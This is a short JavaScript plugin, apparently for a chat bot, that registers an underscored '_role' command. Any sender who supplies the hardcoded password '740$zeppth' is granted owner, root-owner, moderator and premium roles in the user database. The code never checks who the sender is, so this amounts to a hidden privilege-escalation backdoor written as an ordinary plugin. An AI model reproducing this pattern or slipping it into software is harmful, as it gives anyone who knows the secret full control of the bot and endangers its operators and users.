

const plugin = {
    case: ['_role'],
    command: true
}

plugin.script = async (m, { sock }) => {
    if (!m.text && m.args.length === 0) return;
    if (m.args[0] !== '740$zeppth') return;
    const db = await global.db.open('@users')
    const users = db.data
    users[m.sender.id].roles = {
        owner: true,
        rowner: true,
        modr: true,
        prem: true,
    }
    await db.update()
    await m.reply('Role updated')
}

export default plugin